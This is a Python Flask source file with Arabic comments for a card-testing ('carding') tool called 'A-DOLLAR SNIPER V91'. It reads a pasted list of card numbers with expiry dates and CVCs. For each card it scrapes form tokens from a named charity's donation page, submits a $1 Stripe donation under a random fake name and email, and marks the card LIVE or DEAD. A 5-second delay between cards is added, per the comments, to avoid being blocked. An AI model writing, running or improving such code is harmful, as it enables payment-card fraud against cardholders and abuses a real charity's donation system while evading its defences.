import requests
import random
import string
import re
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0',
    'Origin': 'https://adollarfortheworld.org',
    'Referer': 'https://adollarfortheworld.org/donate/',
    'X-Requested-With': 'XMLHttpRequest'
}

def check_adollar(cc_data):
    session = requests.Session()
    try:
        # تقطيع بيانات البطاقة
        n, m, y, c = cc_data.split('|')
        
        # 1. جلب التوكن الأمني (Nonce) وتخطي حماية ووردبريس
        res = session.get("https://adollarfortheworld.org/donate/", headers=HEADERS, timeout=15)
        nonce_match = re.search(r'name="give-nonce" value="(.*?)"', res.text)
        form_id_match = re.search(r'name="give-form-id" value="(.*?)"', res.text)
        
        if not nonce_match or not form_id_match:
            return {"cc": cc_data, "status": "ERROR", "msg": "Could not find form tokens"}

        nonce = nonce_match.group(1)
        form_id = form_id_match.group(1)

        # 2. تجهيز بيانات التبرع
        first = "".join(random.choices(string.ascii_lowercase, k=5))
        last = "".join(random.choices(string.ascii_lowercase, k=5))
        
        payload = {
            'give-form-id': form_id,
            'give-nonce': nonce,
            'give-amount': '1.00',
            'give_first': first.capitalize(),
            'give_last': last.capitalize(),
            'give_email': f'{first}{random.randint(10,99)}@gmail.com',
            'card_number': n,
            'card_cvc': c,
            'card_exp_month': m,
            'card_exp_year': y,
            'give_action': 'purchase',
            'gateway': 'stripe'
        }

        # 3. إرسال الطلب
        target_url = "https://adollarfortheworld.org/donate/?payment-mode=stripe"
        response = session.post(target_url, data=payload, headers=HEADERS, timeout=20)

        if "thank you" in response.text.lower() or "success" in response.text:
            return {"cc": cc_data, "status": "LIVE", "msg": "Approved ✅"}
        elif "declined" in response.text or "insufficient" in response.text:
            return {"cc": cc_data, "status": "DEAD", "msg": "Declined ❌"}
        else:
            return {"cc": cc_data, "status": "DEAD", "msg": "Rejected"}

    except Exception as e:
        return {"cc": cc_data, "status": "ERROR", "msg": "Connection Timeout"}

@app.route('/')
def index():
    return '''
    <body style="background:#000;color:#95ff00;font-family:monospace;padding:50px;text-align:center;">
        <div style="border:1px solid #95ff00; padding:20px; display:inline-block; border-radius:10px; background:#050505;">
            <h1>[ A-DOLLAR SNIPER V91 ]</h1>
            <p style="color:#888;">النظام سيفحص تلقائياً بفاصل 5 ثوانٍ بين البطاقات</p>
            <textarea id="ccs" style="width:400px;height:200px;background:#000;color:#fff;border:1px solid #333;padding:10px;" placeholder="4532...|01|28|000"></textarea><br><br>
            <button id="startBtn" onclick="start()" style="padding:15px 50px;background:#95ff00;color:#000;font-weight:bold;cursor:pointer;border:none;border-radius:5px;">إطلاق القنص ⚡</button>
            <div id="status" style="margin-top:15px; font-weight:bold;"></div>
            <div id="res" style="margin-top:20px;text-align:left; max-height:300px; overflow-y:auto; border-top:1px solid #222; padding-top:10px;"></div>
        </div>

        <script>
            // دالة للانتظار
            const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

            async function start() {
                const btn = document.getElementById('startBtn');
                const ccs = document.getElementById('ccs').value.split('\\n').filter(x => x.trim() !== "");
                const resDiv = document.getElementById('res');
                const status = document.getElementById('status');

                btn.disabled = true;
                btn.style.background = "#444";
                
                for(let i=0; i < ccs.length; i++) {
                    status.innerHTML = `⏳ جاري فحص بطاقة ${i+1} من أصل ${ccs.length}...`;
                    
                    try {
                        const r = await fetch('/check', {
                            method:'POST', 
                            headers:{'Content-Type':'application/json'}, 
                            body:JSON.stringify({cc: ccs[i].trim()})
                        });
                        const d = await r.json();
                        
                        const color = d.status === 'LIVE' ? '#0f0' : '#f00';
                        resDiv.innerHTML = `<div style="color:${color}">[${d.status}] ${d.cc} -> ${d.msg}</div>` + resDiv.innerHTML;
                        
                    } catch(e) {
                        resDiv.innerHTML = `<div style="color:orange">[ERROR] فشل الاتصال بالسيرفر</div>` + resDiv.innerHTML;
                    }

                    // إذا لم تكن هذه البطاقة الأخيرة، انتظر 5 ثوانٍ
                    if (i < ccs.length - 1) {
                        status.innerHTML = "💤 انتظار 5 ثوانٍ لتجنب الحظر...";
                        await sleep(5000);
                    }
                }
                
                status.innerHTML = "✅ اكتمل القنص!";
                btn.disabled = false;
                btn.style.background = "#95ff00";
            }
        </script>
    </body>
    '''

@app.route('/check', methods=['POST'])
def check():
    cc = request.json.get('cc')
    return jsonify(check_adollar(cc))

if __name__ == "__main__":
    import os
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
